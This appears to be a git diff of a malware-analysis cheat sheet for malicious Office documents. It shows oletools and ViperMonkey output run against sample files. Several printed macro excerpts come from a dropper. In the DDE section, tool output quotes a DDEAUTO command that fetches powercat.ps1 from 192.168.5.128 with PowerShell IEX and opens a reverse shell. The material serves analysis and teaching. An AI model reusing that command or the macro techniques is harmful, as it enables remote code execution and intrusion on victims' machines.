@@ -6,7 +6,9 @@ tags:
 ---
 
 # General
+
 ## What to look for in Maldoc analysis?
+
 - URLs to download second payload such as fileless commands or executable
 - Commands such as Powershell, Javascript, wscript, etc
 - Filenames such as what it is downloaded and where it been downloaded
@@ -14,6 +16,7 @@ tags:
 - Encoded file or commands
 
 ## Lab's OS
+
 - Use Windows VM to emulate the maldoc
 - Use REMNUX to analyze the maldoc in depth
 
@@ -258,7 +261,9 @@ Initial assesment is to check `\word\_rels\document.xml.rels`
 Reside in `word/_rels/settings.xml.rels` 
 
 # Macro attack
+
 ## Interesting VBA Functions/Code
+
 1. `AutoOpen()`
 2. `AutoExec()`
 3. `AutoClose()`
@@ -267,7 +272,8 @@ Reside in `word/_rels/settings.xml.rels`
 6. `Private Declare Function WINAPIFUNC Lib DLLNAME`
 
 ## oleid
-Oleid are use to analyze characteristics of the Document
+
+Oleid are use to analyze characteristics of the document.
 
 ```
 remnux@siftworkstation: ~/Work
@@ -292,7 +298,9 @@ Filename: baddoc.doc
 ```
 
 ## oletimes
+
 Determine the times of modification and creation time of stream in document
+
 ```
 remnux@siftworkstation: ~/Work
 $ oletimes baddoc.doc 
@@ -331,93 +339,98 @@ FILE: baddoc.doc
 ```
 
 ## oledump
+
 Use **oledump** to analyze and extract OLE files
 
 `oledump.py filename.doc` = Generally analyze streams that contain macro
 
-    remnux@remnux:~/Desktop$ oledump.py macro-sample.xls 
-      1:       107 '\x01CompObj'
-      2:       244 '\x05DocumentSummaryInformation'
-      3:       200 '\x05SummaryInformation'
-      4:     14882 'Workbook'
-      5:       740 '_VBA_PROJECT_CUR/PROJECT'
-      6:       182 '_VBA_PROJECT_CUR/PROJECTwm'
-      7:        97 '_VBA_PROJECT_CUR/UserForm1/\x01CompObj'
-      8:       293 '_VBA_PROJECT_CUR/UserForm1/\x03VBFrame'
-      9:       187 '_VBA_PROJECT_CUR/UserForm1/f'
-     10:    443812 '_VBA_PROJECT_CUR/UserForm1/o'
-     11: M    2423 '_VBA_PROJECT_CUR/VBA/Module1'
-     12: M    3251 '_VBA_PROJECT_CUR/VBA/Module2'
-     13: m     977 '_VBA_PROJECT_CUR/VBA/Sheet1'
-     14: m     977 '_VBA_PROJECT_CUR/VBA/Sheet2'
-     15: m     977 '_VBA_PROJECT_CUR/VBA/Sheet3'
-     16: M    1275 '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
-     17: M    1907 '_VBA_PROJECT_CUR/VBA/UserForm1'
-     18:      4402 '_VBA_PROJECT_CUR/VBA/_VBA_PROJECT'
-     19:       926 '_VBA_PROJECT_CUR/VBA/dir'
+```
+remnux@remnux:~/Desktop$ oledump.py macro-sample.xls 
+1:       107 '\x01CompObj'
+2:       244 '\x05DocumentSummaryInformation'
+3:       200 '\x05SummaryInformation'
+4:     14882 'Workbook'
+5:       740 '_VBA_PROJECT_CUR/PROJECT'
+6:       182 '_VBA_PROJECT_CUR/PROJECTwm'
+7:        97 '_VBA_PROJECT_CUR/UserForm1/\x01CompObj'
+8:       293 '_VBA_PROJECT_CUR/UserForm1/\x03VBFrame'
+9:       187 '_VBA_PROJECT_CUR/UserForm1/f'
+10:    443812 '_VBA_PROJECT_CUR/UserForm1/o'
+11: M    2423 '_VBA_PROJECT_CUR/VBA/Module1'
+12: M    3251 '_VBA_PROJECT_CUR/VBA/Module2'
+13: m     977 '_VBA_PROJECT_CUR/VBA/Sheet1'
+14: m     977 '_VBA_PROJECT_CUR/VBA/Sheet2'
+15: m     977 '_VBA_PROJECT_CUR/VBA/Sheet3'
+16: M    1275 '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
+17: M    1907 '_VBA_PROJECT_CUR/VBA/UserForm1'
+18:      4402 '_VBA_PROJECT_CUR/VBA/_VBA_PROJECT'
+19:       926 '_VBA_PROJECT_CUR/VBA/dir'
+```
 
 `oledump.py filename.xls -s 11 -v` = Extract macro for the stream 11 for example
 
-    remnux@remnux:~/Desktop$ oledump.py macro-sample.xls -s 16 -v
-    Attribute VB_Name = "ThisWorkbook"
-    Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
-    Attribute VB_GlobalNameSpace = False
-    Attribute VB_Creatable = False
-    Attribute VB_PredeclaredId = True
-    Attribute VB_Exposed = True
-    Attribute VB_TemplateDerived = False
-    Attribute VB_Customizable = True
-    Private Sub Workbook_Open()
-      Call userAldiLoadr
-      Sheet3.Visible = xlSheetVisible
-     Sheet3.Copy
-     End Sub
+```
+remnux@remnux:~/Desktop$ oledump.py macro-sample.xls -s 16 -v
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Private Sub Workbook_Open()
+  Call userAldiLoadr
+  Sheet3.Visible = xlSheetVisible
+ Sheet3.Copy
+ End Sub
+```
 
 ## olevba3
 Use **olevba3** to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to extract VBA Macro code in clear text, deobfuscate and analyze malicious macros
 
 ### General scanning
 ```
-    remnux@remnux:~/Desktop$ olevba3 macro-sample.xls
-    olevba 0.55.1 on Python 3.6.9 - http://decalage.info/python/oletools
-    ===============================================================================
-    FILE: macro-sample.xls
-    Type: OLE
-    -------------------------------------------------------------------------------
-    VBA MACRO ThisWorkbook.cls 
-    in file: macro-sample.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
-    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-    Private Sub Workbook_Open()
-      Call userAldiLoadr
-      Sheet3.Visible = xlSheetVisible
-     Sheet3.Copy
-     End Sub
-    <---snip--->
-    +----------+--------------------+---------------------------------------------+
-    |Type      |Keyword             |Description                                  |
-    +----------+--------------------+---------------------------------------------+
-    |AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
-    |AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
-    |          |                    |objects trigger events                       |
-    |Suspicious|Environ             |May read system environment variables        |
-    |Suspicious|Open                |May open a file                              |
-    |Suspicious|Write               |May write to a file (if combined with Open)  |
-    |Suspicious|Put                 |May write to a file (if combined with Open)  |
-    |Suspicious|Binary              |May read or write a binary file (if combined |
-    |          |                    |with Open)                                   |
-    |Suspicious|Shell               |May run an executable file or a system       |
-    |          |                    |command                                      |
-    |Suspicious|vbNormalNoFocus     |May run an executable file or a system       |
-    |          |                    |command                                      |
-    |Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
-    |Suspicious|MkDir               |May create a directory                       |
-    |Suspicious|CreateObject        |May create an OLE object                     |
-    |Suspicious|Shell.Application   |May run an application (if combined with     |
-    |          |                    |CreateObject)                                |
-    |Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
-    |          |                    |used to obfuscate strings (option --decode to|
-    |          |                    |see all)                                     |
-    +----------+--------------------+---------------------------------------------+
+remnux@remnux:~/Desktop$ olevba3 macro-sample.xls
+olevba 0.55.1 on Python 3.6.9 - http://decalage.info/python/oletools
+===============================================================================
+FILE: macro-sample.xls
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisWorkbook.cls 
+in file: macro-sample.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Workbook_Open()
+  Call userAldiLoadr
+  Sheet3.Visible = xlSheetVisible
+ Sheet3.Copy
+ End Sub
+<---snip--->
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
+|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|Suspicious|Environ             |May read system environment variables        |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Write               |May write to a file (if combined with Open)  |
+|Suspicious|Put                 |May write to a file (if combined with Open)  |
+|Suspicious|Binary              |May read or write a binary file (if combined |
+|          |                    |with Open)                                   |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|vbNormalNoFocus     |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+|Suspicious|MkDir               |May create a directory                       |
+|Suspicious|CreateObject        |May create an OLE object                     |
+|Suspicious|Shell.Application   |May run an application (if combined with     |
+|          |                    |CreateObject)                                |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
++----------+--------------------+---------------------------------------------+
 ```
 
 ### Extract VBA
@@ -521,89 +534,91 @@ $ olevba3 --deobf --reveal baddoc.doc
 ```
 
 ## mraptor
-**mraptor** is a tool designed to detect most malicious VBA Macros using generic heuristics.
 
-    remnux@remnux:~/Desktop$ mraptor -m macro-sample.xls 
-    MacroRaptor 0.55 - http://decalage.info/python/oletools
-    This is work in progress, please report issues at https://github.com/decalage2/oletools/issues
-    ----------+-----+----+--------------------------------------------------------
-    Result    |Flags|Type|File                                                    
-    ----------+-----+----+--------------------------------------------------------
-    SUSPICIOUS|AWX  |OLE:|macro-sample.xls                                        
-              |     |    |Matches: ['Workbook_Open', 'MkDir', 'CreateObject']     
-    
-    Flags: A=AutoExec, W=Write, X=Execute
-    Exit code: 20 - SUSPICIOUS
+**mraptor** is a tool designed to detect most malicious VBA Macros using generic heuristics.
+```
+remnux@remnux:~/Desktop$ mraptor -m macro-sample.xls 
+MacroRaptor 0.55 - http://decalage.info/python/oletools
+This is work in progress, please report issues at https://github.com/decalage2/oletools/issues
+----------+-----+----+--------------------------------------------------------
+Result    |Flags|Type|File                                                    
+----------+-----+----+--------------------------------------------------------
+SUSPICIOUS|AWX  |OLE:|macro-sample.xls                                        
+          |     |    |Matches: ['Workbook_Open', 'MkDir', 'CreateObject']     
+
+Flags: A=AutoExec, W=Write, X=Execute
+Exit code: 20 - SUSPICIOUS
+```
 
 ## ViperMonkey
 Use **ViperMonkey** to emulate the VBA. Vmonkey is a VBA Emulation engine written in Python, designed to analyze and deobfuscate malicious VBA Macros contained in Microsoft Office files.
 
 ```
-    remnux@remnux:~/Desktop$ vmonkey macro-sample.xls
-         _    ___                 __  ___            __             
-    | |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
-    | | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
-    | |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,< /  __/ /_/ / 
-    |___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
-         /_/                                           /____/   
-    vmonkey 0.08 - https://github.com/decalage2/ViperMonkey
-    THIS IS WORK IN PROGRESS - Check updates regularly!
-    Please report any issue at https://github.com/decalage2/ViperMonkey/issues
-    
-    ===============================================================================
-    FILE: macro-sample.xls
-    INFO     Starting emulation...
-    INFO     Emulating an Office (VBA) file.
-    INFO     Reading document metadata...
-    Traceback (most recent call last):
-      File "/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py", line 15, in <module>
-        from unotools import Socket, connect
-    ModuleNotFoundError: No module named 'unotools'
-    ERROR    Running export_all_excel_sheets.py failed. Command '['python3', '/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py', '/tmp/tmp_excel_file_3189461446']' returned non-zero exit status 1
-    INFO     Saving dropped analysis artifacts in .//macro-sample.xls_artifacts/
-    INFO     Parsing VB...
-    Error: [Errno 2] No such file or directory: ''.
-    -------------------------------------------------------------------------------
-    VBA MACRO ThisWorkbook.cls 
-    in file:  - OLE stream: u'_VBA_PROJECT_CUR/VBA/ThisWorkbook'
-    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-    -------------------------------------------------------------------------------
-    VBA CODE (with long lines collapsed):
-    Private Sub Workbook_Open()
-      Call userAldiLoadr
-      Sheet3.Visible = xlSheetVisible
-     Sheet3.Copy
-     End Sub
-    
-    -------------------------------------------------------------------------------
-    PARSING VBA CODE:
-    INFO     parsed Sub Workbook_Open (): 3 statement(s)
-    <---snip--->
-    -------------------------------------------------------------------------------
-    PARSING VBA CODE:
-    INFO     parsed Sub Mace5 (): 2 statement(s)
-    INFO     parsed Sub Maceo8 (): 2 statement(s)
-    INFO     parsed Sub unAldizip ([ByRef Fname as Variant, ByRef FileNameFolder as Variant]): 4 statement(s)
-    -------------------------------------------------------------------------------
-    VBA MACRO Module2.bas 
-    in file:  - OLE stream: u'_VBA_PROJECT_CUR/VBA/Module2'
-    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-    -------------------------------------------------------------------------------
-    VBA CODE (with long lines collapsed):
-    Sub userAldiLoadr()
-    
-        Dim path_Aldi_file As String
-        Dim file_Aldi_name  As String
-        Dim zip_Aldi_file  As Variant
-        Dim fldr_Aldi_name  As Variant
-        
-        Dim byt() As Byte
-        
-        Dim ar1Aldi() As String
-        
-        file_Aldi_name = "dhrwarhsav"
-        
-        fldr_Aldi_name = Environ$("ALLUSERSPROFILE") & "\Edlacar\"
+remnux@remnux:~/Desktop$ vmonkey macro-sample.xls
+ ____ __  _____ 
+| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
+| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
+| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,< /  __/ /_/ / 
+|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
+ /_/   /____/   
+vmonkey 0.08 - https://github.com/decalage2/ViperMonkey
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/ViperMonkey/issues
+
+===============================================================================
+FILE: macro-sample.xls
+INFO Starting emulation...
+INFO Emulating an Office (VBA) file.
+INFO Reading document metadata...
+Traceback (most recent call last):
+  File "/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py", line 15, in <module>
+from unotools import Socket, connect
+ModuleNotFoundError: No module named 'unotools'
+ERRORRunning export_all_excel_sheets.py failed. Command '['python3', '/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py', '/tmp/tmp_excel_file_3189461446']' returned non-zero exit status 1
+INFO Saving dropped analysis artifacts in .//macro-sample.xls_artifacts/
+INFO Parsing VB...
+Error: [Errno 2] No such file or directory: ''.
+-------------------------------------------------------------------------------
+VBA MACRO ThisWorkbook.cls 
+in file:  - OLE stream: u'_VBA_PROJECT_CUR/VBA/ThisWorkbook'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+Private Sub Workbook_Open()
+  Call userAldiLoadr
+  Sheet3.Visible = xlSheetVisible
+ Sheet3.Copy
+ End Sub
+
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+INFO parsed Sub Workbook_Open (): 3 statement(s)
+<---snip--->
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+INFO parsed Sub Mace5 (): 2 statement(s)
+INFO parsed Sub Maceo8 (): 2 statement(s)
+INFO parsed Sub unAldizip ([ByRef Fname as Variant, ByRef FileNameFolder as Variant]): 4 statement(s)
+-------------------------------------------------------------------------------
+VBA MACRO Module2.bas 
+in file:  - OLE stream: u'_VBA_PROJECT_CUR/VBA/Module2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+Sub userAldiLoadr()
+
+Dim path_Aldi_file As String
+Dim file_Aldi_name  As String
+Dim zip_Aldi_file  As Variant
+Dim fldr_Aldi_name  As Variant
+
+Dim byt() As Byte
+
+Dim ar1Aldi() As String
+
+file_Aldi_name = "dhrwarhsav"
+
+fldr_Aldi_name = Environ$("ALLUSERSPROFILE") & "\Edlacar\"
 ```
 
 ## VBA Debugging
@@ -615,47 +630,50 @@ Breakpoint on the code, usually on entry point of the code -> run the VBA -> Wat
 
 # VBA stomping (if macro was destroyed)
 Use pcodedmp to disassemble p-code macro code from filename.doc
-    
-    remnux@remnux:~/Desktop$ pcodedmp macro-sample.xls -d
-    Processing file: macro-sample.xls
-    ===============================================================================
-    Module streams:
-    _VBA_PROJECT_CUR/VBA/ThisWorkbook - 1275 bytes
-    Line #0:
-    	FuncDefn (Private Sub Workbook_Open())
-    Line #1:
-    	ArgsCall (Call) userAldiLoadr 0x0000 
-    Line #2:
-    	Ld xlSheetVisible 
-    	Ld Sheet3 
-    <---snip--->
-    Line #4:
-    	Ld xl3DAreaStacked 
-    	MemStWith LineStyle 
-    Line #5:
-    Line #6:
-    	EndWith 
-    Line #7:
-    Line #8:
-    	StartWithExpr 
-    	Ld xlEdgeRight 
-    	Ld Selection 
-    	ArgsMemLd Borders 0x0001
-    <---snip--->
-    Line #20:
-    	FuncDefn (Sub Maceo8())    
+```
+remnux@remnux:~/Desktop$ pcodedmp macro-sample.xls -d
+Processing file: macro-sample.xls
+===============================================================================
+Module streams:
+_VBA_PROJECT_CUR/VBA/ThisWorkbook - 1275 bytes
+Line #0:
+FuncDefn (Private Sub Workbook_Open())
+Line #1:
+ArgsCall (Call) userAldiLoadr 0x0000 
+Line #2:
+Ld xlSheetVisible 
+Ld Sheet3 
+<---snip--->
+Line #4:
+Ld xl3DAreaStacked 
+MemStWith LineStyle 
+Line #5:
+Line #6:
+EndWith 
+Line #7:
+Line #8:
+StartWithExpr 
+Ld xlEdgeRight 
+Ld Selection 
+ArgsMemLd Borders 0x0001
+<---snip--->
+Line #20:
+FuncDefn (Sub Maceo8())
+```
 
 # DDE attack
 Use **msodde** to detect and extract DDE/DDEAUTO links from MS Office documents, RTF and CSV
 
-    remnux@remnux:~/Desktop$ msodde DDE-attack.docx 
-    msodde 0.55 - http://decalage.info/python/oletools
-    THIS IS WORK IN PROGRESS - Check updates regularly!
-    Please report any issue at https://github.com/decalage2/oletools/issues
-    
-    Opening file: DDE-attack.docx
-    DDE Links:
-     DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.5.128/powercat.ps1');powercat -c 192.168.5.128 -p 1111 -e cmd
+```
+remnux@remnux:~/Desktop$ msodde DDE-attack.docx 
+msodde 0.55 - http://decalage.info/python/oletools
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/oletools/issues
+
+Opening file: DDE-attack.docx
+DDE Links:
+ DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.5.128/powercat.ps1');powercat -c 192.168.5.128 -p 1111 -e cmd
+```
 
 # Excel 4.0 macros
 **XLMMacroDeobfuscator** can be used to extract or decode obfuscated XLM macros (also known as Excel 4.0 macros)
